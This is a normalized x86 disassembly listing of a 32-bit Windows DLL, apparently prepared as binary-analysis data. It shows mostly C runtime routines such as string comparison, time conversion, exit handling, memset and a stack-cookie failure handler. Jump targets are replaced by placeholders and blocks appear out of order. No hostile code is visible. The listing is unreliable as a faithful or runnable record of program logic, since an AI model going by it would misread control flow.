mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x1
jne r-xdata
push [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
call sub_1000ddf7
pop ecx
pop ebp
retn 0xc
call sub_100160ea
sub_1000df10
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x18 ]
call sub_1000c185
xor ebx ebx
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0xc ] bl
je r-xdata
cmp [ ebp + 0x8 ] ebx
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000db40
add esp 0xc
cmp [ ebp - 0xc ] bl
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
push edi
mov edi [ ebp + 0xc ]
cmp edi ebx
jne r-xdata
call sub_1001034f
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_100102e7
add esp 0x14
cmp [ ebp - 0xc ] bl
je r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
push esi
call sub_1001034f
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_100102e7
add esp 0x14
cmp [ ebp - 0xc ] bl
je r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
movzx edx [ ebp - 0x8 ]
lea ecx [ edx + eax ]
test [ ecx + 0x1d ] 0x10
je r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
movzx ecx dx
movzx cx [ ecx + 0x11d ]
movzx ecx cx
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov dl [ edx ]
cmp dl bl
jne r-xdata
movzx ecx [ edi ]
test [ ecx + eax + 0x1d ] 0x4
mov [ ebp - 0x8 ] ebx
jne r-xdata
pop edi
movzx edx [ ebp - 0x4 ]
lea ecx [ edx + eax ]
test [ ecx + 0x1d ] 0x10
je r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov [ ebp - 0x8 ] ecx
shl ecx 0x8
movzx dx dl
or cx dx
inc [ ebp + 0x8 ]
movzx ecx cx
mov si cx
mov [ ebp - 0x8 ] ecx
cmp si [ eax + 0x10 ]
jb r-xdata
mov [ ebp - 0x8 ] ebx
jmp r-xdata
cmp [ ebp - 0xc ] bl
je r-xdata
movzx ecx cx
mov si bx
jmp r-xdata
movzx ecx dx
movzx cx [ ecx + 0x11d ]
movzx ecx cx
jmp r-xdata
mov dl [ edi ]
dec [ ebp + 0x10 ]
cmp dl bl
je r-xdata
mov [ ebp - 0x4 ] ebx
jmp r-xdata
cmp si [ eax + 0x16 ]
jb r-xdata
cmp si [ eax + 0x12 ]
ja r-xdata
mov si [ ebp - 0x8 ]
xor eax eax
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
mov [ ebp - 0x4 ] ecx
sbb eax eax
and eax 0x2
dec eax
cmp [ ebp - 0xc ] bl
je r-xdata
cmp si bx
je r-xdata
shl ecx 0x8
movzx dx dl
or cx dx
movzx ecx cx
inc edi
mov [ ebp - 0x4 ] ecx
cmp cx [ eax + 0x10 ]
jb r-xdata
mov cx [ ebp - 0x4 ]
movzx cx [ edi ]
movzx ecx cx
movzx edx cl
inc edi
test [ edx + eax + 0x1d ] 0x4
mov [ ebp - 0x4 ] ecx
je r-xdata
cmp si [ eax + 0x18 ]
ja r-xdata
add si [ eax + 0x14 ]
jmp r-xdata
pop esi
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
cmp cx [ eax + 0x16 ]
jb r-xdata
cmp cx [ eax + 0x12 ]
ja r-xdata
add si [ eax + 0x1a ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
movzx cx [ ecx ]
dec [ ebp + 0x10 ]
inc [ ebp + 0x8 ]
movzx ecx cx
movzx edx cl
test [ edx + eax + 0x1d ] 0x4
mov [ ebp - 0x8 ] ecx
je r-xdata
cmp cx si
jne r-xdata
cmp cx [ eax + 0x18 ]
ja r-xdata
add cx [ eax + 0x14 ]
jmp r-xdata
add cx [ eax + 0x1a ]
jmp r-xdata
sub_1000e155
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x10 ]
call sub_1000c185
xor ebx ebx
cmp [ ebp + 0x8 ] ebx
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
cmp esi ebx
jne r-xdata
call sub_1001034f
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_100102e7
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
push edi
mov edi [ ebp - 0xc ]
cmp [ edi + 0x8 ] ebx
jne r-xdata
call sub_1001034f
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_100102e7
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov eax [ ebp + 0x8 ]
movzx ax [ eax ]
inc [ ebp + 0x8 ]
movzx ecx ax
movzx eax cl
test [ eax + edi + 0x1d ] 0x4
je r-xdata
push esi
push [ ebp + 0x8 ]
call sub_10016180
pop ecx
pop ecx
jmp r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
leave
retn
movzx ax [ esi ]
movzx eax ax
movzx edx al
inc esi
test [ edx + edi + 0x1d ] 0x4
je r-xdata
mov eax [ ebp + 0x8 ]
mov al [ eax ]
cmp al bl
jne r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
pop esi
cmp ax cx
jne r-xdata
mov dl [ esi ]
cmp dl bl
jne r-xdata
shl ecx 0x8
movzx ax al
or cx ax
inc [ ebp + 0x8 ]
movzx ecx cx
xor ecx ecx
jmp r-xdata
pop edi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
sbb eax eax
and eax 0x2
dec eax
cmp cx bx
jne r-xdata
shl eax 0x8
movzx dx dl
or ax dx
movzx eax ax
inc esi
xor eax eax
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_1000e293
mov edi edi
push ebp
mov ebp esp
call sub_1000fd57
push [ ebp + 0x10 ]
add eax 0x20
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10016208
add esp 0x10
pop ebp
retn
sub_1000e2cb
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push ebx
xor ebx ebx
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x4 ] ebx
cmp esi ebx
jne r-xdata
push edi
push 0x24
push 0xff
push esi
call sub_1000ebe0
mov edi [ ebp + 0xc ]
add esp 0xc
cmp edi ebx
jne r-xdata
call sub_1001034f
push 0x16
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_100102e7
add esp 0x14
mov eax esi
jmp r-xdata
mov eax [ edi + 0x4 ]
cmp eax ebx
mov ecx [ edi ]
jg r-xdata
call sub_1001034f
push 0x16
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_100102e7
add esp 0x14
jmp r-xdata
pop esi
pop ebx
leave
retn
cmp eax 0x7
jl r-xdata
jl r-xdata
mov eax esi
jmp r-xdata
call sub_10016b1f
lea eax [ ebp - 0x8 ]
push eax
call sub_10016df2
pop ecx
test eax eax
je r-xdata
jg r-xdata
call sub_1001034f
push 0x16
pop esi
mov [ eax ] esi
cmp ecx ebx
jb r-xdata
pop edi
lea eax [ ebp - 0xc ]
push eax
call sub_10016e2b
pop ecx
test eax eax
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_100101bf
add esp 0x14
cmp ecx 0x93406fff
jbe r-xdata
lea eax [ ebp - 0x4 ]
push eax
call sub_10016e64
pop ecx
test eax eax
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_100101bf
add esp 0x14
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x4 ]
cmp ecx ebx
mov edi [ edi ]
jl r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_100101bf
add esp 0x14
push eax
push esi
call sub_10016baf
pop ecx
pop ecx
cmp eax ebx
jne r-xdata
jg r-xdata
cmp [ ebp - 0x8 ] ebx
je r-xdata
mov eax [ ebp - 0x4 ]
cdq
sub edi eax
lea eax [ ebp - 0x14 ]
push eax
sbb ecx edx
push esi
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x10 ] ecx
call sub_10016baf
pop ecx
pop ecx
cmp eax ebx
jne r-xdata
cmp edi 0x3f480
jbe r-xdata
mov eax [ esi ]
cdq
mov edi eax
mov eax [ ebp - 0x4 ]
mov ebx edx
cdq
sub edi eax
sbb ebx edx
push esi
call sub_10016b6e
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x8 ] ebx
je r-xdata
push 0x0
push 0x3c
push ebx
push edi
call sub_10016ec0
mov edi eax
mov eax [ esi + 0x4 ]
mov ebx edx
cdq
push 0x0
add edi eax
push 0x3c
adc ebx edx
push ebx
push edi
call sub_10016f70
mov [ esi + 0x4 ] eax
test eax eax
jge r-xdata
add eax 0x3c
add edi 0xffffffc4
mov [ esi ] eax
adc ebx 0xffffffff
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
add eax ecx
cdq
mov ecx eax
mov eax edx
mov [ ebp + 0x8 ] eax
mov eax [ esi ]
cdq
mov edi eax
sub edi ecx
mov ecx [ ebp + 0x8 ]
mov ebx edx
sbb ebx ecx
mov [ esi + 0x20 ] 0x1
jmp r-xdata
xor eax eax
push esi
call sub_10016b6e
pop ecx
test eax eax
je r-xdata
push 0x0
push 0x3c
push ebx
push edi
call sub_10016ec0
mov edi eax
mov eax [ esi + 0x8 ]
mov ebx edx
cdq
push 0x0
add edi eax
push 0x18
adc ebx edx
push ebx
push edi
call sub_10016f70
mov [ esi + 0x8 ] eax
test eax eax
jge r-xdata
add eax 0x3c
add edi 0xffffffc4
mov [ esi + 0x4 ] eax
adc ebx 0xffffffff
push 0x0
push 0x3c
push ebx
push edi
call sub_10016f70
mov [ esi ] eax
test eax eax
jge r-xdata
mov eax [ ebp - 0xc ]
cdq
sub [ ebp - 0x14 ] eax
lea eax [ ebp - 0x14 ]
push eax
sbb [ ebp - 0x10 ] edx
push esi
call sub_10016baf
pop ecx
pop ecx
cmp eax ebx
jne r-xdata
push 0x0
push 0x18
push ebx
push edi
call sub_10016ec0
mov ecx eax
test edx edx
jl r-xdata
add eax 0x18
add edi 0xffffffe8
mov [ esi + 0x8 ] eax
adc ebx 0xffffffff
mov [ esi + 0x20 ] 0x1
jmp r-xdata
mov eax [ esi + 0x18 ]
lea eax [ ecx + eax + 0x7 ]
cdq
push 0x7
pop edi
idiv edi
add [ esi + 0xc ] ecx
mov eax [ esi + 0xc ]
mov [ esi + 0x18 ] edx
test eax eax
jg r-xdata
jg r-xdata
add [ esi + 0x1c ] ecx
add ecx 0x16d
add [ esi + 0x1c ] ecx
add eax 0x1f
dec [ esi + 0x14 ]
mov [ esi + 0xc ] eax
mov [ esi + 0x10 ] 0xb
jmp r-xdata
mov eax [ esi + 0x18 ]
add eax ecx
push 0x7
cdq
pop edi
idiv edi
add [ esi + 0xc ] ecx
mov [ esi + 0x18 ] edx
test ecx ecx
jbe r-xdata
test edx edx
jg r-xdata
jl r-xdata
test ecx ecx
jae r-xdata
sub_1000e583
mov edi edi
push ebp
mov ebp esp
push esi
call sub_10017022
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebp
retn
push [ ebp + 0x8 ]
push esi
call sub_1000e2cb
neg eax
sbb eax eax
pop ecx
not eax
pop ecx
and eax esi
sub_1000e5aa
push 0xc
push r--data
call sub_10011e54
xor eax eax
xor esi esi
cmp [ ebp + 0x8 ] esi
setne al
cmp eax esi
jne r-xdata
call sub_1001203c
push 0x20
pop ebx
add eax ebx
push eax
push 0x1
call sub_10012154
pop ecx
pop ecx
mov [ ebp - 0x4 ] esi
call sub_1001203c
add eax ebx
push eax
call sub_10017059
pop ecx
mov edi eax
lea eax [ ebp + 0xc ]
push eax
push esi
push [ ebp + 0x8 ]
call sub_1001203c
add eax ebx
push eax
call sub_100105a2
mov [ ebp - 0x1c ] eax
call sub_1001203c
add eax ebx
push eax
push edi
call sub_100170f5
add esp 0x18
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000e646
mov eax [ ebp - 0x1c ]
call sub_1001034f
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_100102e7
add esp 0x14
or eax 0xffffffff
jmp r-xdata
call sub_10011e99
retn
sub_1000e66f
mov edi edi
push ebp
mov ebp esp
push edi
mov edi 0x3e8
pop edi
pop ebp
retn
test eax eax
je r-xdata
push edi
call [ Sleep@IAT ]
push [ ebp + 0x8 ]
call [ GetModuleHandleW@IAT ]
add edi 0x3e8
cmp edi 0xea60
ja r-xdata
sub_1000e69f
mov edi edi
push ebp
mov ebp esp
call sub_10013433
push [ ebp + 0x8 ]
call sub_10013288
push [ rw-data ]
call sub_1000fb0b
push 0xff
call eax
add esp 0xc
pop ebp
retn
sub_1000e6c8
mov edi edi
push ebp
mov ebp esp
push r--data
call [ GetModuleHandleW@IAT ]
test eax eax
je r-xdata
pop ebp
retn
push r--data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call eax
sub_1000e71d
mov edi edi
push ebp
mov ebp esp
push esi
mov esi eax
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jb r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
pop ebp
retn
add esi 0x4
call eax
sub_1000e73a
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
jmp r-xdata
cmp esi [ ebp + 0xc ]
jb r-xdata
test eax eax
jne r-xdata
pop esi
pop ebp
retn
mov ecx [ esi ]
test ecx ecx
je r-xdata
add esi 0x4
call ecx
sub_1000e75e
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_10017267
push r--data
push r--data
call sub_1000e73a
pop ecx
pop ecx
test eax eax
jne r-xdata
push rw-data
call sub_10017320
pop ecx
test eax eax
je r-xdata
pop ebp
retn
push sub_10015f43
call sub_10017250
mov eax r--data
mov [ esp ] r--data
call sub_1000e71d
cmp [ rw-data ] 0x0
pop ecx
je r-xdata
push [ ebp + 0x8 ]
call [ rw-data ]
pop ecx
xor eax eax
push rw-data
call sub_10017320
pop ecx
test eax eax
je r-xdata
push 0x0
push 0x2
push 0x0
call [ rw-data ]
sub_1000e7e3
push 0x18
push r--data
call sub_10011e54
push 0x8
call sub_1001135a
pop ecx
and [ ebp - 0x4 ] 0x0
xor ebx ebx
inc ebx
cmp [ rw-data ] ebx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000e8fa
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ rw-data ] ebx
mov al [ ebp + 0x10 ]
mov [ rw-data ] al
cmp [ ebp + 0xc ] 0x0
jne r-xdata
call sub_10011e99
retn
mov [ rw-data ] ebx
push 0x8
call sub_10011280
pop ecx
push [ ebp + 0x8 ]
call sub_1000e6f3
push r--data
mov eax r--data
call sub_1000e71d
pop ecx
push [ rw-data ]
call sub_1000fb0b
pop ecx
mov edi eax
mov [ ebp - 0x28 ] edi
test edi edi
je r-xdata
push r--data
mov eax r--data
call sub_1000e71d
pop ecx
push [ rw-data ]
call sub_1000fb0b
pop ecx
mov esi eax
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x20 ] esi
call sub_1000fb02
cmp [ esi ] eax
je r-xdata
sub esi 0x4
mov [ ebp - 0x24 ] esi
cmp esi edi
jb r-xdata
cmp esi edi
jb r-xdata
push [ esi ]
call sub_1000fb0b
mov edi eax
call sub_1000fb02
mov [ esi ] eax
call edi
push [ rw-data ]
call sub_1000fb0b
mov edi eax
push [ rw-data ]
call sub_1000fb0b
add esp 0xc
cmp [ ebp - 0x1c ] edi
jne r-xdata
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x28 ] edi
mov [ ebp - 0x20 ] eax
mov esi eax
mov [ ebp - 0x24 ] esi
cmp [ ebp - 0x20 ] eax
je r-xdata
mov edi [ ebp - 0x28 ]
jmp r-xdata
sub_1000e94a
mov edi edi
push esi
call sub_1000fb02
mov esi eax
push esi
call sub_1001346c
push esi
call sub_10017657
push esi
call sub_100101b0
push esi
call sub_10017648
push esi
call sub_10017639
push esi
call sub_10017427
push esi
call sub_10015f69
push esi
call sub_10017416
push sub_1000e925
call sub_1000fa90
add esp 0x24
mov [ rw-data ] eax
pop esi
retn
sub_1000e998
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push esi
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x14 ]
call sub_1000c185
mov edx [ ebp + 0x8 ]
xor esi esi
cmp edx esi
jne r-xdata
push ebx
mov ebx [ ebp + 0xc ]
cmp ebx esi
jne r-xdata
call sub_1001034f
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_100102e7
add esp 0x14
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x8 ] esi
jne r-xdata
call sub_1001034f
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_100102e7
add esp 0x14
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
push edi
mov edi 0x200
lea eax [ ebp - 0x14 ]
push eax
push ebx
push edx
call sub_1000c245
add esp 0xc
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
pop esi
leave
retn
movzx edx cx
lea ecx [ edx + eax ]
test [ ecx + 0x1d ] 0x10
je r-xdata
cmp [ edx ] 0x0
jne r-xdata
pop ebx
mov ecx [ ebp - 0xc ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
movzx esi dx
movzx cx [ ecx + 0x11d ]
movzx esi cx
jmp r-xdata
push 0x1
push [ eax + 0x4 ]
lea ecx [ ebp - 0x4 ]
push 0x2
push ecx
push 0x2
dec edx
push edx
push edi
push [ eax + 0xc ]
lea eax [ ebp - 0x14 ]
push eax
call sub_10017a8b
add esp 0x24
cmp eax 0x1
jne r-xdata
xor esi esi
jmp r-xdata
movzx edx cx
lea ecx [ edx + eax ]
test [ ecx + 0x1d ] 0x10
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
movzx cx [ ebx ]
movzx ecx cx
movzx edx cl
inc ebx
test [ edx + eax + 0x1d ] 0x4
je r-xdata
cmp eax 0x2
jne r-xdata
movzx ax [ ebp - 0x4 ]
jmp r-xdata
movzx ecx dx
movzx cx [ ecx + 0x11d ]
movzx ecx cx
jmp r-xdata
push 0x1
push [ eax + 0x4 ]
lea ecx [ ebp - 0x4 ]
push 0x2
push ecx
push 0x2
lea ecx [ ebx - 0x1 ]
push ecx
push edi
push [ eax + 0xc ]
lea eax [ ebp - 0x14 ]
push eax
call sub_10017a8b
add esp 0x24
cmp eax 0x1
jne r-xdata
xor ecx ecx
jmp r-xdata
call sub_1001034f
mov [ eax ] 0x16
cmp [ ebp - 0x8 ] 0x0
je r-xdata
movzx ax [ ebp - 0x4 ]
mov ecx 0x100
imul ax cx
movzx cx [ ebp - 0x3 ]
add ax cx
inc [ ebp + 0x8 ]
movzx esi ax
mov eax [ ebp - 0x10 ]
jmp r-xdata
sbb eax eax
and eax 0x2
dec eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
test si si
je r-xdata
cmp cx si
jne r-xdata
cmp eax 0x2
jne r-xdata
movzx ax [ ebp - 0x4 ]
jmp r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
pop edi
mov ecx [ ebp - 0xc ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
jmp r-xdata
movzx ax [ ebp - 0x4 ]
mov ecx 0x100
imul ax cx
movzx cx [ ebp - 0x3 ]
add ax cx
movzx ecx ax
mov eax [ ebp - 0x10 ]
inc ebx
jmp r-xdata
xor eax eax
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
movzx cx [ edx ]
movzx ecx cx
movzx esi cl
inc edx
test [ esi + eax + 0x1d ] 0x4
mov [ ebp + 0x8 ] edx
je r-xdata
sub_1000ebe0
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
test edx edx
je r-xdata
mov eax [ esp + 0x4 ]
retn
xor eax eax
mov al [ esp + 0x8 ]
test al al
jne r-xdata
push edi
mov edi ecx
cmp edx 0x4
jb r-xdata
cmp edx 0x100
jb r-xdata
mov [ edi ] al
add edi 0x1
sub edx 0x1
jne r-xdata
neg ecx
and ecx 0x3
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov ecx eax
shl eax 0x8
add eax ecx
mov ecx eax
shl eax 0x10
add eax ecx
mov ecx edx
and edx 0x3
shr ecx 0x2
je r-xdata
sub edx ecx
jmp sub_10017b27
[ edi ]
test edx edx
je r-xdata
mov [ edi ] al
add edi 0x1
sub ecx 0x1
jne r-xdata
sub_1000ec5a
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0x8 ]
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
mov [ ebp + 0x8 ] esi
call sub_1000c185
xor ebx ebx
cmp esi ebx
jne r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx ebx
jne r-xdata
cmp [ ebp + 0x10 ] ebx
je r-xdata
mov edx [ ebp - 0xc ]
cmp [ edx + 0x8 ] ebx
jne r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
call sub_1001034f
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_100102e7
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp [ ebp + 0x10 ] ebx
je r-xdata
push [ ebp + 0x10 ]
push ecx
push esi
call sub_1000c4b0
add esp 0xc
cmp [ ebp - 0x4 ] bl
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] bl
je r-xdata
push edi
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
inc esi
inc ecx
cmp al bl
je r-xdata
inc esi
inc ecx
cmp [ ebp + 0x10 ] ebx
je r-xdata
cmp [ ebp + 0x10 ] ebx
je r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov [ esi - 0x1 ] bl
jmp r-xdata
mov al [ ecx ]
dec [ ebp + 0x10 ]
mov [ esi ] al
inc esi
inc ecx
cmp al bl
jne r-xdata
pop edi
push [ ebp + 0x10 ]
push ebx
push esi
call sub_1000ebe0
add esp 0xc
mov al [ ecx ]
dec [ ebp + 0x10 ]
movzx edi al
test [ edi + edx + 0x1d ] 0x4
mov [ esi ] al
je r-xdata
jmp r-xdata
mov [ esi - 0x2 ] bl
sub_1000ed57
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x18 ]
call sub_1000c185
mov eax [ ebp - 0x14 ]
xor ebx ebx
cmp [ eax + 0x8 ] ebx
jne r-xdata
mov eax [ ebp + 0xc ]
cmp eax ebx
jne r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10017c80
pop ecx
pop ecx
cmp [ ebp - 0xc ] bl
je r-xdata
cmp [ eax ] bl
jne r-xdata
call sub_1001034f
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_100102e7
add esp 0x14
cmp [ ebp - 0xc ] bl
je r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
push esi
mov esi [ ebp + 0x8 ]
cmp esi ebx
jne r-xdata
cmp [ ebp - 0xc ] bl
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
push edi
push eax
mov edi esi
call sub_10014870
mov [ ebp - 0x8 ] esi
sub [ ebp - 0x8 ] eax
push esi
call sub_10014870
add eax [ ebp - 0x8 ]
pop ecx
pop ecx
cmp [ esi ] bl
je r-xdata
call sub_1001034f
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_100102e7
add esp 0x14
cmp [ ebp - 0xc ] bl
je r-xdata
mov eax [ ebp + 0x8 ]
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0xc ] bl
je r-xdata
sub esi [ ebp + 0xc ]
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
xor eax eax
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
mov dl [ edi ]
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x1 ] dl
cmp dl bl
je r-xdata
pop esi
cmp [ ecx ] bl
je r-xdata
mov dl [ ecx ]
cmp dl bl
je r-xdata
cmp [ ebp - 0xc ] bl
je r-xdata
movzx ecx [ ebp - 0x1 ]
mov edx [ ebp - 0x14 ]
mov cl [ ecx + edx + 0x1d ]
and cl 0x4
inc edi
inc esi
test cl cl
je r-xdata
cmp [ esi + ecx ] dl
jne r-xdata
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ edi ] bl
jne r-xdata
cmp [ edi ] bl
je r-xdata
inc ecx
cmp [ esi + ecx ] bl
jne r-xdata
pop edi
cmp edi eax
ja r-xdata
inc edi
inc esi
sub_1000eeaf
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push ebx
push [ ebp + 0x10 ]
xor ebx ebx
lea ecx [ ebp - 0x14 ]
mov [ ebp - 0x4 ] ebx
call sub_1000c185
mov ecx [ ebp + 0x8 ]
cmp ecx ebx
jne r-xdata
push esi
mov esi [ ebp - 0x10 ]
cmp [ esi + 0x8 ] ebx
jne r-xdata
call sub_1001034f
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_100102e7
add esp 0x14
cmp [ ebp - 0x8 ] bl
je r-xdata
push edi
push [ ebp + 0xc ]
push ecx
call sub_1000d460
pop ecx
pop ecx
cmp [ ebp - 0x8 ] bl
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp + 0xc ] eax
inc ecx
mov dl [ ecx ]
cmp dl bl
je r-xdata
pop esi
mov ecx [ ebp - 0xc ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
pop ebx
leave
retn
inc ecx
cmp dl bl
jne r-xdata
mov [ ebp - 0x4 ] ecx
cmp [ ebp - 0x4 ] ebx
jmp r-xdata
movzx edi dl
shl eax 0x8
or eax edi
cmp [ ebp + 0xc ] eax
jne r-xdata
mov dl [ ecx ]
movzx eax dl
movzx edi al
test [ edi + esi + 0x1d ] 0x4
je r-xdata
pop edi
cmp [ ebp - 0x8 ] bl
je r-xdata
jne r-xdata
lea eax [ ecx - 0x1 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
sub_1000ef82
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] ebx
mov [ rw-data ] esi
mov [ rw-data ] edi
mov [ rw-data ] ss
mov [ rw-data ] cs
mov [ rw-data ] ds
mov [ rw-data ] es
mov [ rw-data ] fs
mov [ rw-data ] gs
pushfd
pop [ rw-data ]
mov eax [ ebp ]
mov [ rw-data ] eax
mov eax [ ebp + 0x4 ]
mov [ rw-data ] eax
lea eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x320 ]
mov [ rw-data ] 0x10001
mov eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov eax [ rw-data ]
mov [ ebp - 0x328 ] eax
mov eax [ rw-data ]
